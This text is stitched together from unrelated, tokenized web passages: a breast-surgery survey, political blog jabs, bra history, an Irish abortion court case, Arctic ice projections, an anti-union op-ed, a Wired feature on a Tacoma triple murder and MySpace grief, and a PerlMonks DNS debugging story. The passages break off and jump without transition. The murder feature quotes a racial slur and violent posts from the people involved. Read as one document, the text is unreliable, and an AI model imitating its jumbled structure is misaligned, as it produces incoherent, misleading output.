Most British women considering breast enlargement surgery want their busts to be just a bit bigger and say it is n’t to attract men .
A survey by Mybreast.org , Britain ’s only specialist breast augmentation service , revealed that 78 percent of women looking into the procedure only wanted to go up one or two cup sizes .
Only three percent of the more than 1,500 respondents said they wanted larger breasts to attract men , while 66 percent of women viewed bigger breasts as a way to boost confidence .
Thirty percent said it could make them feel more womanly .
The two most important factors for considering breast surgery were the surgeon ’s reputation , qualifications and the quality of the implants .
“ It is very reassuring that these findings reflect our core values at MyBreast.org , ” MyBreast.org consultant Plastic Surgeon Patrick Mallucci said in a statement on Wednesday .
According to the survey , breast surgery was the most popular cosmetic surgery procedure , with 43 percent of respondents saying they would choose it over liposuction or a nose job .
MyBreast.org offers a complete package price for breast surgery of 4,250 pounds ( $ 8,442 ) which also includes a lifetime follow - up policy .

Both can't win .

But what I really find amusing is how much liberals hate Lieberman , but wish that he was vice - president today .
I hate to admit it , but Bush looked better in his flight suit than Lieberman does here .
What a dork .
Makes you want to beat him up for his lunch money .

The best part comes when Bill cuts her mic and accuses her of " misle[ ading ] my audience , who comes here for the truth , " only to then go on and mislead his own audience .

Lowlights courtesy of MediaMatters :
O'REILLY : Stop talking .
It 's not about you , and you 're misleading the audience .
Stop talking . [...]
Cut her mike .
Cut her mike .
She 's not allowed to speak for three minutes .
That 's all right . [...]
It 's not -- as I said , open transcript means it gets to The New York Times .
There is a transcript to the senators who , if they lie , can charge them with crimes .
You know it , and you misled my audience , who comes here for the truth .
What can we do to her ?
What can we do to her ?
It appears Bill got the idea of an " open " transcript from something Wiehl said .
Too bad he 's flat wrong .
Let 's see what Snowjob has to say about the issue of transcripts :
Q : Tony , does the offer include note - taking for members of the committee ?
If not a formal transcript , can they take notes ?
TONY SNOW : Yes .
Yes ....[ F] rankly , when it comes to a fact answer , people there are going to be able to get it right , just as I think you get it right when you take notes based on a conversation with me for your reporting , without a transcript .
Think about if for a second :
Any loyal FOX viewer that watches Hannity & Colmes and listens to O'Reilly now ( falsely ) believes that the White House offer includes testimony under oath with a transcript .
No wonder their veiwers were the most serially misinformed during the lead up to the Iraq War .

Apparently , the bra has just turned 100 .
I ’m not sure how anyone can know the exact date the bra came into existence – but hey , 100 years is impressive non the less .
You ’ve probably read the many horror stories surrounding the history of the bra and lingerie in general – when corsets were so tight women regularly fainted , failed to keep their food down , and even suffered the occasional pieced liver , courtesy of their own ribs .
While it has n’t always been fun , the changing silhouette has continually been tightly driven by fashion trends .
Options for the bra are now far and wide reaching – from sports , to padded , to convertible and so on .
So , have things stood still or will they only get more interesting ?
Where will the bra be in years to come ?
For the most recent issue of Seventh Sin Magazine , we asked some lingerie designers where they thought underwear trends were headed in the future .
Australian lingerie designer Shiori Pike believes that vintage will be key , “ 1950 ‚ Äôs glamour pin up girls , silk lots of lace trims , a more European influence … ”
Meanwhile , Kay Cohen of Pleasure State focused on the fact that lingerie trends “ will demand more and more of technical improvements which will bring benefits to fit and comfort . ”
Kay also believes that lingerie is “ experiencing its greatest moments of creativity .
At long last lingerie is a very key player in the fashion industry ” and in the future we can expect to find “ exciting innerwear styling making its appearance as outerwear . ”
Well , I sure hope so .

A pregnant 17 - year - old in state care in Ireland began a court battle yesterday to be allowed to travel to England for an abortion , as the country 's failure to resolve the ambiguities in its abortion laws threatened to erupt into a constitutional crisis .
The teenager , who is four months into the pregnancy , is seeking an abortion because the baby has got a rare brain condition and will not live more than three days after birth , she has been told .
Identified only as Miss D , the teenager has been in the care of Ireland 's health service executive ( HSE ) , since February .
The government agency has overruled her wish for an abortion in Britain .
The young woman 's father is absent and her mother 's behaviour had led to earlier court proceedings .
Abortion in this predominantly Catholic country , where the influence of the church has gradually weakened , remains illegal , with the ban on it written into the constitution .
Abortions can only be performed if there is a substantial risk to the mother 's life , which includes the threat of suicide .
The law does not permit abortion on grounds of foetal abnormality .
Most women seeking an abortion go to England for the operation .
Successive complex cases have led to hearings at the European court of human rights and several divisive national referenda .
Since 2002 , three teenagers in care have been allowed to go abroad for terminations .
But the republic 's abortion laws have never been fully clarified .
As long ago as 1992 , a supreme court judge warned that the failure to introduce proper legislation was " inexcusable " .
Last year a 45 - year - old woman lost a case in Europe in which she said she had been denied her human rights because she could not have an abortion on grounds of foetal abnormality .
The court dismissed her application saying the issue had not yet been dealt with by the Irish courts .
This latest case , emerging in the opening days of a general election campaign , has prompted fresh calls for constitutional reform .
Mary Muldowney , of the Alliance for Choice , which campaigns for safe , free , legal abortion in Ireland , has accused the government of hypocrisy .
" The HSE must retract their callous approach to [ Miss ] D's tragic case and facilitate her choice for a termination , " Ms Muldowney said .
" She cannot afford any further delay and the Irish people will not thank the HSE or the government for again brutalising a young woman in their name . "
The application on behalf of the young woman has been brought by her boyfriend , who is supporting her .
The teenager , from the Leinster region , had not considered having an abortion until told about the foetus 's medical condition .
Doctors say the baby suffers from anencephaly , a condition where the front part of the brain is missing .
The condition is detected through blood screening .
Such children are normally blind , deaf , and unconscious .
The high court in Dublin has been told that life expectancy would be somewhere between several hours and , at the maximum , three days .
Miss D's lawyers are seeking the removal of the restrictions on her right to leave Ireland and the rescinding of a request sent to the Gardai to prevent her travelling abroad .
The legal challenge will be heard at Dublin 's Four Courts tomorrow .
Lawyers for the teenager said it was a matter of " great importance " that the case be heard as speedily as possible .
The court heard that the young woman was not suicidal but had not wanted to have an abortion before hearing about her baby 's condition .
Irish politicians yesterday expressed sympathy for the predicament of the teenager .
Enda Kenny , the leader of the main opposition party , Fine Gael , described it as a " very serious and very tragic case " .
Pat Rabbitte , the leader of the opposition Labour party , said he hoped that the teenager would be allowed to travel abroad for a termination .
Backstory
Ireland 's constitution was altered by national referendum in 1983 to give unborn children equal rights to life as mothers .
In 1992 , a teenager aged 14 , who became pregnant through being raped , was refused permission to travel abroad in order to get an abortion .
The case eventually went to the supreme court in Ireland where , because she was considered to be at risk of suicide , the decision was finally made to allow her to leave the republic for the operation .
Since 1992 , four governments have refused to introduce legislation confirming the supreme court 's judgment , and instead tried to get public support for a more restricted move .
During 2002 , a constitutional amendment which was designed to remove the threat of suicide as legal grounds for an abortion was narrowly defeated in a national referendum .
By about 2040 , the Arctic may be nearly devoid of sea ice during the late summer unless greenhouse gas emissions are significantly curtailed .
If you 're looking to photograph a polar bear hopping sea ice floes on your next summer cruise , you better hurry because in 30 years , the Arctic Sea could be free of ice .
Simulating the climate with computer models , researchers analyzed how global warming could affect sea-ice in the future .
The results , published in the Dec. 12 issue of Geophysical Research Letters , indicate that if greenhouse gases continue being released at their current rate , most of the Arctic basin will be ice free in September by 2040 [ animation ] .
Additionally , winter ice , now about 12 feet thick , will become less than 3 feet thick .
One previous study predicted that the region will have no summer ice by 2060 , another study forecasts that the Arctic will be icy up until 2105 .
The rapid meltdown , result of a warming globe , will itself accelerate the heating of the oceans , according to the latest study .
" As the ice retreats , the ocean transports more heat to the Arctic and the open water absorbs more sunlight , further accelerating the rate of warming and leading to the loss of more ice , " said study lead author , Marika Holland , a scientists from NCAR .
" This is a positive feedback loop with dramatic implications for the entire Arctic region . "
Additionally , ocean circulations — affected by global warming — are driving warm ocean currents into the Arctic .
" We have already witnessed major losses in sea ice , but our research suggests that the decrease over the next few decades could be far more dramatic than anything that has happened so far , " Holland said .
" These changes are surprisingly rapid . "
However , the future of the Arctic does n't have to be so grim : running simulations with less greenhouse gases , the researchers found that the summer sea ice melted at a much slower rate .
" Our research indicates that society can still minimize the impacts on Arctic ice , " Holland said .

What makes Earth habitable ?
This LiveScience original video explores the science of global warming and explains how , for now , conditions here are just right .
LABOR UNIONS ’ importance in the workplace has fallen steadily since 1950 , when roughly a third of American workers were unionized .
Today , that number is well below 10 % in the private sector .
The Employee Free Choice Act , now before Congress , aims to reverse that trend by making it easier for unions to gain certification and stiffening penalties for interfering with a unionization drive .
After all , supporters argue , without union representation , how can individual workers have the bargaining power needed to get their fair share of the economic pie ?
But maybe unions are n’t so crucial to worker well - being .
When more than 90 % of the private - sector labor force is n’t unionized , why do 97 % of us earn above the minimum wage ?
If our bargaining power is so pitiful , why do n’t greedy employers exploit us and drive wages down to the legal minimum ?
The simple answer is that bargaining power comes from having alternatives .
Even in the absence of unions , employers have to treat workers well to attract and keep them .
In a workplace as dynamic as that of the United States , where millions of jobs are destroyed and created every quarter , a company ’s ability to exploit workers is greatly limited by how easy it is to find another job .

Ultimately , it is competition among employers that protects us from exploitation .
Even those who would seem to be the most vulnerable — immigrants who struggle to speak English , for example — can earn much more than the minimum wage simply because of competition for their skills .
Cleaning people routinely earn $ 20 an hour , more than most cities ’ so - called living wage .
Look at workers ’ share of the nation ’s income .
In 1950 , employee compensation was 53 % of gross domestic income .
In 2005 , that number was 57 % .
Somehow , as unions ’ strength dwindled over the decades , employees ’ share actually grew .
And it ’s a share of a dramatically larger pie , the result of the incredible economic boom of the last half a century .
The source of such economic growth is better - educated workers and technology that makes them even more productive .
Those with more skills are more attractive to employers .
But are n’t those gains mainly going to those at the top ?
Do n’t we need unions to preserve the middle class ?
That ’s the rhetoric that union leaders use .
Yet real median family income has risen steadily since 1950 .
Some of that increase is because more families have two earners .
But gains have been steady even for families in which only one person is working .
The middle class is n’t shrinking ; it ’s getting richer .
What used to be wealthy is now middle class .

Not every American worker shares equally in prosperity .
But skipping a secret - ballot vote — as the Employee Free Choice Act would — is an odd way to help the disadvantaged .
The argument is that if workers can simply sign a card in support of the union , they ’ll avoid employer intimidation .
But eliminating the ratifying vote replaces the threat of employer intimidation with the threat of union intimidation .
That will probably increase union representation .
But will it help workers ?
Unions help those they represent by trying to raise wages above what they would otherwise be .
To the extent they succeed , they reduce the demand for labor in unionized shops .
That means more workers have to find employment in non-unionized shops , pushing down wages there .
That ’s especially tough on workers with limited skills and education .
The sad irony of unions is that they can only improve the lot of their members at the expense of other workers .
A better way to increase wages is to make workers more productive .
That lifts everyone ’s standard of living .
Rather than trying to revitalize unions , we ought to be looking for ways to revitalize our moribund public education system .
That is the road to true , long - term prosperity .
DEANNE BAYS WAS WORRIED about her kid brother , Daniel .
His girlfriend had n't heard from him for a day and a half .
There was no sign of him online , even though he usually spent hours a day on MySpace .
And he'd been hanging out a lot with that drug dealer .
Bays hoped that did n't mean young Daniel Varo was back in jail .
All day long on February 7 , even as Bays crammed for Accounting 211 and Spanish 102 and took her daughter to the dentist , she wondered where he could be .
That evening , two hours into her 4 - to - 10 pm shift at the Norm Thompson catalog company , just outside Portland , Oregon , Bays finally got a chance to check her own MySpace page for messages .
There was one from her husband , frantic , telling Bays to phone right away – even though he knew that she was n't allowed to make personal calls on the job .
Bays ' inbox also had emails from two of Varo 's ex-girlfriends .
" What did he do now ? " she groaned to herself , clicking on one of the notes : im freekin out i cant stop crying and i dont want to believe its true .
he cant be gone … please call me or someone call me please .
This article has been reproduced in a new format and may be missing content or contain faulty links .
Contact wiredlabs@wired.com to report an issue .
Bays , a petite redhead with a broad , smooth face , walked into the Thompson break room .
She called her husband .
" You have to come home , " he whispered .
Varo , 22 , was dead – shot in the head as he sat at his computer .
Varo 's friend Darren Christian , 28 , and one of Christian 's friends , 21 - year - old Lindy Cochran , had also been killed in the same gangland style .
In the days and weeks that followed , Deanne Bays followed a path familiar to families involved in a violent crime – she sobbed in grief and anger , numbly arranged a funeral , turned to friends for comfort .
But Bays did it in two worlds at once – the virtual and the real .
Bays suffered in private , but she also shared her pain on MySpace .
The aftermath of the murders resonated through the social network – touching the investigating detectives , the lawyers and even the victims .
Daniel Varo was dead , but he did n't disappear .
He had lived so much of his life online that pieces of him lingered on the Web – a ghost in the machine .
PEOPLE DROVE FOR HUNDREDS OF MILES to have Daniel Varo work on their cars .
It was easy for him , and he loved it – he'd do it for strangers stuck on the side of the road , in the rain , in the middle of the night .
And good luck getting him to charge for the work ; maybe instead of cash he'd take parts for his Acura Integra Type R , a street racer he drove on the twisting roads of suburban Portland at five times the speed limit – holding his cell phone against the dashboard so a buddy could hear the engine growl .
He was a 6 ' 2 " , 220 - pound overgrown kid , a mile - a- minute goofball talking at hurricane speeds , hoovering up fast food , bopping around raves like a noodle - armed maniac .
But Varo was also a " magnet to trouble , " his sister says .
" All the cops knew his plates . "
He rolled with a tough crowd .
He had served six months in the Shutter Creek Correctional Institution for intent to sell 76 hits of ecstasy .
He had even managed to get busted for jaywalking .
The threat of parole violations always loomed .
i need to get on the ball , he once posted on his sister 's MySpace page .
i am getting old already haha .
Then in January 2005 , intent on making a clean start , Varo and his girlfriend – a sinewy , 18 - year - old blonde named Ashley Foley – moved from Portland to a secluded suburb 30 miles north of Tacoma , Washington , to live with Varo 's mother .
Away from friends , they started spending more and more time on MySpace , uploading their personalities , preferences , and relationships to the social network .
She 'd post flirty comments and decorated her page in pink , with pictures of herself in garters and thongs ; he posted an online kissing test and a picture of a Type R .
They spent the better part of a year keeping to themselves , mostly .
Foley danced at Fox 's , a local strip club .
Varo delivered pizzas and prepped for computer science classes – he rebuilt computers almost as well as cars .
But on New Year 's Eve , Varo and Foley went to a rave called Apocalypse 2 at a club in a trashy little exurb southeast of Tacoma .
Varo was excited ; he kept telling Foley that he was hoping to run into an old Seattle rave buddy , " DC . "
They met up with drug dealer and party promoter Darren Christian just after midnight .
Six feet tall , with sculpted shoulders and pale - green eyes , Christian was charismatic , oozing confidence .
He 'd drop three grand at a bar without blinking and bought a motorcycle before he knew how to ride .
One time , about to go snowboarding , he handed a friend a 4 - inch wad of beer - soaked cash to hold while he was on the slopes .
Christian had n't bothered to count it , but his friend did : $ 28,000 .
Fueling all this was an ecstasy business with hundreds of thousands of pills in inventory .
" He got the most ass , kicked the most ass , drove the fastest car , had the coolest dog and the dopest house , " says Sherri Jensen , another Fox 's dancer .
" Everything about him made you want to hang out with him , all the time . "
Christian and Varo had a bond that was almost chemical .
" A little match made in heaven , " Foley says .
" Both really loud , always going - going - going . "
The pair partied for a full day after the New Year 's rave .
Within days , Varo was crashing at Christian 's rental house , a white stucco place on Sixth and South Union avenues in Tacoma 's emerging - from - seedy Hilltop neighborhood .
Foley built Christian 's MySpace page ; he used it to promote his parties and hook up with girlfriends .
Christian decorated the page like his house , with pictures of Japanese motorcycles and Al Pacino in Scarface .
Soon after he started his online life , girls were leaving notes , telling him , I can't wait to touch you !
Through a fellow car junkie , Varo met Ulysses Handy III .
Known on MySpace as Lucifer – he had hellraiser tattooed across his back and 666 on his caramel - brown abdomen – Handy had just finished serving nearly eight years in jail for beating a guy with a baseball bat .
Since his release , Handy had been suspected of shooting two people and molesting his 14 - year - old cousin .
A 1998 hospital psychological evaluation mentioned past diagnoses ranging from " impulse control disorder " to " Jekyll / Hyde personality shifts . "
The first time Handy went over to Christian 's house , he figured he'd rob the place ; Christian kept a safe in the bedroom , supposedly packed with drugs and money .
But Christian was " so cool , " Handy told friends , he could n't bring himself to do it .
In fact , he could barely bring himself to leave Christian and Varo at all .
The three became inseparable .
It was an unusual trio – Handy was the only African - American in an extended clique of white and Asian kids .
At Sixth and South Union , the guys would play videogames , Taser one another , and clown around with Foley and the strippers who always seemed to be glomming onto Christian .
The computer was always on , and MySpace was always booted up .
Late one night , Varo hopped on the PC and clicked over to Handy 's page to tease him about his " Lucifer " persona – was n't that the name of the cat in Cinderella ?
Handy wrote Varo back : u assholes are stupid !!!
but I love yall 2 death !
HAHAHAHAHA .
Varo fired back with a picture of the cartoon cat Photoshopped with Handy 's face .
Christian put up a slide show of pictures that had been taken in his living room .
In one shot , Handy is whipping Varo with a belt .
In the next , Handy is on his knees , hands tied behind his back .
Christian has a gun to the back of his head .
Handy 's history of violence worried some of Christian 's and Varo 's friends , who kept asking why they all continued to hang out together .
" Karma , " Christian would answer .
Treat people right and they 'll be good to you .
But in early February , for some reason , the goodwill started to dissipate .
Christian lost an expensive jacket with some drugs in a pocket and asked Handy if he knew where it was .
To Handy , that sounded like an accusation .
Tempers flared .
Until I get that jacket back , Christian told Handy , do n't bother coming to Sixth and South Union .
Handy could n't let the slight go .
He had his buddy Sirree Muhammad get him a .357 Magnum for a " lick " – a robbery .
Handy swore he was n't planning to hurt anyone , but " if they try to fight or something , " he said , " I 'm gonna kill 'em . "
At 12:56 am on February 7 , just before he , Muhammad , and two others headed out , Handy logged onto MySpace and posted an entry titled " The Nature Of The Beast !!! "
It had only one line : A tiger Cant Change its Stripes !!!
So STOP trying to change ME !
POLICE FOUND VARO half - curled against the wall of the spare bedroom at Sixth and South Union .
Head tucked in , arms folded across his chest , Varo looked like he'd been stopped mid-somersault ; more likely , he had fallen off the office chair just in front of the PC .
His head was pierced by a single hole about 2 inches behind his left ear .
His hair was matted with blood ; a dark halo of it spread around him .
In the living room , Christian lay facedown , his driver 's license and a crumpled scrap of paper tossed on his back .
His wound was almost identical to Varo's .
Perpendicular to him was Lindy Cochran 's body , her painted toenails nearly touching his hand .
She , too , had been shot in the head .
Pepsi bottles , noodle - soup containers , and PlayStation controllers lay on the table beside them .
Christian 's safe was gone .
Detectives investigating the case could n't help running into Handy .
He rented a room nearby with his fiancée .
He was a suspect in several other cases , including shootings in October and January .
And he was one of at least three people who had been in the Sixth and South Union house after the murders but before the police arrived .
On February 8 , he told detectives that he'd gone in to pick up any drugs , so the victims ' parents would n't be upset when police found them .
Soon after , police formally charged Handy – not for the Sixth and South Union murders , but for the other shootings he was allegedly involved in .
The charges were two counts each of assault in the first degree and unlawful possession of a firearm .
Foley posted a note to Varo 's page :
We caught 'em baby !
Fuck that nigger .
MYSPACE STARTED OUT as a way for indie bands to connect to new fans .
But the network and others like it made it so easy to create communities that before long all the halfway - cool teens and early twentysomethings had to have pages of their own .
Their relationships now exist as much online as in reality .
With more than 120 million registered users on MySpace , odds dictate that some of them will die by violence .
The ghoulish , encyclopedic
Web site MyDeathSpace chronicles about 600 victims and more than 35 accused , convicted , or executed murderers with MySpace profiles .
A year after Virginia Commonwealth University freshman Taylor Behl was found murdered in September 2005 , friends were still posting messages to her page saying how much they missed her .
Ryan Dallas
Cook 's crew still write him notes about their trips to Vegas and Disneyland ; he died in a hit - and - run motorcycle accident in October 2005 .
Other social networks are quickly piling up their own tragedies and online afterlives .
Classmates of 23 - year - old Jason Shephard , strangled to death in September , share memories and pictures on Facebook , as do friends of John and Kevin Frazza , whose father shot them to death and then killed himself in July .
Law enforcement authorities across the country turn to MySpace for help with roughly 150 criminal probes a month .
In the Varo case , police spent hours on the victims ' MySpace pages .
All those comments and pictures posted from the Sixth and South Union PC gave officers a map of the victims ' interconnected social landscape .
On February 9 , two days after the murders , detectives asked MySpace to freeze the accounts of everyone involved to help in " determining possible suspects as well as assist in determining the time frame for the crime . "
Varo 's family and friends reached out to him in the digital netherworld as soon as they found out he was dead .
They flocked to his MySpace page to express their sorrow and vent their outrage .
You were supposed to be here this weekend , Bays wrote .
DAMMIT !
Why did n't you just go home ?
It went this way for months .
Varo 's circle kept leaving messages on his page as if he were still replacing engines and dancing silly at raves .
Foley was especially forlorn : I slept in your bed last night … and sprayed armani cologne everywhere so it smelled like you .
They told him about their vacations , asked him car repair questions , even described the sunny weather outside and the cheese eggs they cooked for breakfast .
" Darren and Daniel put so much of themselves into those pages – ' This is who I am , this is the music I like , these are my friends ' – that it 's like a little piece of them is still here , " Bays explains .
" That 's how we talked , anyway , the last few months .
I 'm just picking up where we left off . "
Maybe Bays was trying to avoid grief by holding on to her brother 's digital shell .
So what if she was ?
" That ' get on with life , ' ' get rid of it ' stuff ?
The whole concept does n't seem to work anymore , " says Connie Saindon , founder of the San Diego - based Survivors of Violent Loss Program .
" If there are statues of George Washington , why can't we keep these people around , too ? "
DEANNE BAYS had been through tragedy before .
In July 2001 , Lydia Braschler - Varo , Deanne and Danny 's 13 - year - old sister , was kidnapped .
The following April , a man in search of wild mushrooms found her body dumped down a 70 - foot ravine ; she had been beaten and strangled with a telephone cord .
The horrible events made headlines , but there was hardly anyone to share Bays ' pain .
" I had a baby , still nursing , " she remembers .
" I just clung to her . "
Sitting at a desk festooned with Christmas lights , fairy prints and half - moon candle holders , Bays says she discovered that this second heartbreak could be different .
Condolences poured in online – Honey we are here for you – and not just from her inner circle .
Varo 's old neighbor emailed to say he had set up a new MySpace group for people to share memories and pictures .
Hollie Arrell - Nothwang , one of Varo 's friends , announced she was planning a memorial at the Portland International Raceway .
" She just sort of appeared out of nowhere – in my face , insistent , " Bays says .
" When I could n't handle things , she did .
She just understood . "
Two weeks later , at the raceway , a DJ pounded techno beats through the night .
Candles were lit , engines gunned , and tears shed .
At the climax , Varo 's black Type R , decorated with baby - blue teddy bears and ribbons , peeled out onto the track with a deafening howl .
The flood of newfound friends sometimes made Bays uncomfortable .
Who were all these people ?
I was having a decent day today until I came on here .
I did n't cry once .
I was scrolling down my page , and saw all the comments my brother put on my page .
I keep pretending to everyone that I 'm okay .
When I sit all alone as I am right now , the pain comes over me .
I do n't feel like I will ever heal .
Over the weeks that followed , Bays cataloged her grief : the decision to put school on hold , the endless questions from her kids , the days spent smoking and absent - mindedly staring at the TV .
She dyed her hair pink and got a tattoo of a fairy across her china - white back – its design includes the initials of her baby brother and sister .
And knowing who was responsible for her brother 's death did little to help her sort out her feelings ; after all , nothing would bring her brother back .
Foley , Varo 's girlfriend , kept a blog , too .
And her feelings were intense .
Foley knew Handy ; he even called her from jail to deny his involvement in the murders .
Foley poured her anger onto Handy 's MySpace page .
I was fuckin nice to you , i hung out with you , i bought you shit , you called me … and then you fuckin MURDERED my boyfriend you piece of shit .
666 ? Hellraiser ?
I thought you were a fuckin freak when i saw that shit , and this just confirms it .
Have fun playin with the devil now .
But Handy had defenders , too – especially since the papers continued to report that police had no suspects in the case .
HEY I KNOW U BOUT TO BE OUT SOON .
AND BUST A CAP ON THESE DUMB ASS MUTHAFUCKAS !!!!!!
In many murders , victims and their killers are acquainted : wife shoots husband , crack dealer stabs customer , pimp strangles streetwalker .
So you would expect some interaction among the friends and relatives of the perpetrator and the victim .
In fact , typically there 's little .
Even after intra-family crimes , relatives tend to choose sides and stay on them .
" People distance themselves , " says Charles Figley , head of Florida State University 's Traumatology Institute .
" The ties that bind people – births , marriages – split apart because of a catastrophe . "
On social network sites , those sides interact .
Victims ' buddies can howl at killers ' cousins , and the cousins can scream back .
" All the old social relationship models and theories do n't apply anymore , " Figley adds .
" We 're rewriting textbooks here . "
TWO WEEKS AFTER FOLEY announced that Handy had been " caught , " police still had n't charged him with the Sixth and South Union killings .
But after interviews with Handy 's roommates , relatives , and MySpace friends , the detectives were closing in .
On February 22 , they brought Sirree Muhammad in for questioning .
He began to cry almost immediately .
" No one deserves to die like that , " Muhammad sobbed .
Yes , he had been at Christian 's place that night , along with Handy and two others .
Yes , he gave Handy a gun .
As Muhammad drove around the neighborhood looking out for cops , Handy went inside – he later told reporters the full story .
Handy hugged Cochran and turned down her offer of some leftover ribs .
He greeted Varo , who was sitting at the computer , and then glanced out the back door to make sure no one was there .
Then he walked into the living room where Christian was .
They spoke briefly ; Handy gave Christian a kiss .
Then he took out the gun .
About 20 minutes later , Handy emerged , handed Muhammad the .357 , and said , " Get rid of it . "
When they got back to Handy 's apartment , he said : " Their heads are gone . "
The people who'd been with Muhammed outside the house confirmed much of that chronology .
Police recovered the safe and charged Handy on February 24 , hours before Varo 's memorial .
On Handy 's MySpace page , Varo and Christian 's crew ranted against the accused killer .
Even though the evidence was lining up against Handy , his defenders kept posting .
He did n't kill them , they said .
Handy had gone back inside the house after the murders , but so had several others .
Duy Nguyen , a friend of Handy and Varo , stopped by around 1 pm after receiving a call from Foley asking if he had seen her boyfriend .
He knocked on the door , then looked through the window blinds .
Nguyen saw the bodies on the floor and went inside the house .
After trying to call 911 and failing , he called Foley , who was then living back home in Oregon .
He says she told him to wait for her ; Foley says he misunderstood .
Either way , when she arrived three hours later , she called the police .
Other accused murderers have found themselves defended on social networks , too .
Hours after police arrested 21 - year - old Brandon Menard on suspicion of stabbing his parents and sister to death in August , friends were vehemently proclaiming his innocence on his MySpace page .
Laura Rangel , the mother of a 23 - year - old murder suspect in Oakland , California , posted police reports and transcripts of witness interviews on MySpace , which seemed to weaken the case against her daughter .
The local prosecutor fought to have the page shut down .
But that only served to draw more press coverage and outside interest .
The MySpace pages related to the Sixth and South Union killings also attracted gawkers .
Some were just curious , like the spectators who sit in the back of a courtroom during a trial .
But others had an agenda .
The " Ludwigapalooza " pranksters , who gathered on the Xanga.com and MySpace pages of murderer David Ludwig , claimed they were out to undermine the " mob mentality " that takes over whenever an accused killer has a social network site .
Exactly how this goal was accomplished by posting TEXAS MOTHAFUCKAS !!!!!
on Handy 's page is unclear .
More unsettling to Bays and Foley were the Internet sleuths .
In the summer of 2005 , a group spearheaded by Atlanta opera singer turned crime blogger Steve Huff used Web postings to plot the movements of pedophile Joseph Edward Duncan III and to link him to an eight - year - old unsolved murder .
Less than a week after the Sixth and South Union murders were announced , Huff put together a reasonable sketch of what had happened , citing nothing but MySpace and a local TV news report .
But Foley resented what commenters on Huff 's site were saying .
They wondered aloud why Varo 's friends did n't call police to the scene right away – and whether the victims somehow brought this upon themselves .
There once was a saying : live by the gun … die by the gun .
Foley responded :
Get your facts straight before you go bashing on people you dont even know .
And Huff came to her defense , blasting commenters on his own site .
If you are coming here looking to bitch about something inappropriate or strange in a victims ' life … you can go someplace else .
Following the links from the crime sites to Varo's and Foley 's pages , people naturally found Bays ' blog .
After an August mention on MyDeathSpace , Bays ' readership went from about a dozen a day to several hundred .
For her , that was too many eyes .
Those posts had too much out there for everyone to read , Bays blogged .
I deleted them all .
IT'S A SUNNY THURSDAY in late July .
A half - dozen tricked - out trucks and hand - tooled street racers pull up to Bays ' tan ranch house , one by one .
People Bays has known for years – like Varo 's jailhouse buddy Mike Whittington , sporting spiderweb tattoos and a wife - beater – mingle with the woman who helped plan Varo 's raceway memorial , Hollie Arrell - Nothwang .
She reaches into her husband 's neon - lit 2006 Honda Ridgeline and takes out a laptop to pull up Whittington 's MySpace page .
On it are pictures of the " Coupe de Varo , " the 244 - horsepower dream car they 're all chipping in to build .
Everyone trades stories about Varo – the time he shot a friend in the ass with a paintball gun , the ride to the hospital he gave a stranger , the stray cat he took home as a kid that multiplied into 27 , the shot glasses he brought back from San Francisco .
Foley shows off the new tattoo on the inside of her lip – and the dv inked on her arm .
Folks pass cases of beer , throw chicken on the grill , and pop wheelies on built - from - scratch motorcycles .
Bays moves from group to group , doling out hugs , barking orders .
From a boom box , Snoop Dogg shouts at everyone not to stop .
" At least there 's some good that 's come out of something so tragic , " Bays says to me .
" We 're all here . "
On Sunday , Bays and I climb into her 2004 Chevy Malibu and head north on I - 5 .
She cuts across lanes and darts through traffic at 90 miles an hour all the way to Rochester , Washington .
We reach a cemetery the size of a gridiron , lined with pine trees .
The family can't afford a headstone ; no epitaph marks Daniel Jacob Varo 's grave .
There 's just a purple pinwheel and a stuffed blue bunny in a corner of the grass .
Six weeks later , she calls to tell me about a dream she had about her brother .
" It was really vivid .
And he kept saying to me , over and over , ' You can always talk to me when I 'm gone . ' "
The same day , police report that Ulysses Handy III will plead guilty to three counts of aggravated first - degree murder and accept three consecutive life sentences , one for each of his victims .
Bays posts a message on her brother 's MySpace page :
It 's done .
A sad tale of disappointment , confusion , betrayal and enlightenment .
Also an annoying bug that you should never run into , but could cost you quite a lot of hair pulling if you do .
Perl is only tangentially related to this problem , so if you are looking for perl code , skip this node .
The Gathering Storm
The task seemed simple enough .
A new Unix box had come in and I needed to install some standard ( but non-core ) modules .
No problem .
# perl - MCPAN -e install Foo . . .
Could not connect to host ftp.perl.org with Net:: FTP [ download ]
Say what ?
The local system is up and on the net .
A quick browser pop confirms that we can see google ( and therefore , by definition , the whole Internet ;-) .
Maybe the CPAN module is fubared ?
# ftp ftp.perl.org ftp : ftp.perl.org : Unknown host ftp > [ download ]
Okaaayyy .
That 's odd .
I was able to get to external sites by name just a second ago .
Maybe ftp.perl.org 's DNS is hosed at the moment ?
# nslookup ftp.perl.org
Server : nameserver Address : 10.0.0.53 Non-authoritative answer : ftp.perl.org canonical name = ftp.cpan.ddns.develooper.com .
Name : ftp.cpan.ddns.develooper.com
Address : 64.74.207.33 Name : ftp.cpan.ddns.develooper.com
Address : 131.93.97.19 # ftp 64.74.207.33 220 ProFTPD 1.2.9 Server ( mirror1.internap.com ) [ mirror1.internap.com + ] Name ( 64.74.207.33:root ) : [ download ]
So .
I can look up the IP number by name .
I can ftp to the number .
But I can not ftp to the name .
Another quick check shows that I can ftp to plenty of other FTP archives by name , just not ftp.perl.org .
Odd .
It 's a clean OS install , so I go look on another machine that 's been in use for a while .
Same symptoms .
A different ( Unix ) OS .
Same symptoms .
I try directly from my desktop ( Win* ) .
Works just fine .
Huh ?
Golf It Down
Well , when you 've got one working and one not working , you 've got a solution if you can just find it .
The simplest test case is pretty obvious .
I can either ftp to ftp.perl.org or I cannot .
I pop two windows , one local to my Win box , one on the Unix box :
Unix Windows $ ftp ftp.perl.org ftp : Unknown host ftp.perl.org C:\ > ftp ftp.perl.org ftp : Unknown host ftp.perl.org
WHAT ?!?
But that just worked !
I check to make sure nothing else has crashed in the meantime .
Unix Windows C:\> ftp ftp.perl.org 220 ProFTPD 1.2.9 Server ( mirror1.internap.com ) Name ( 64.74.207.33 :foo ) : $ ftp ftp.perl.org ftp : Unknown host ftp.perl.org
Right .
Fine .
No problem .
After the Nervous Breakdown
It looks like there is some sort of problem caused when the Unix box looks up ftp.perl.org which not only screws up the requesting machine , but also temporarily screws up every other machine that uses that DNS server .
Sounds like a DNS server bug , but what is triggering it ?
New test case : packet sniff the DNS traffic during each scenario to see WTF is going on .
What immediately pops out is that the Unix box ( the one causing the problem ) has twice as many exchanges with the DNS server than the Windows box .
And the first request it makes is not for the same information as the Windows box asks for .
The Unix box first asks for an AAAA record .
And the nameserver barfs up a lung .
It turns out that if I force the Windows box to request the AAAA record first , its behaviour matches the Unix box .
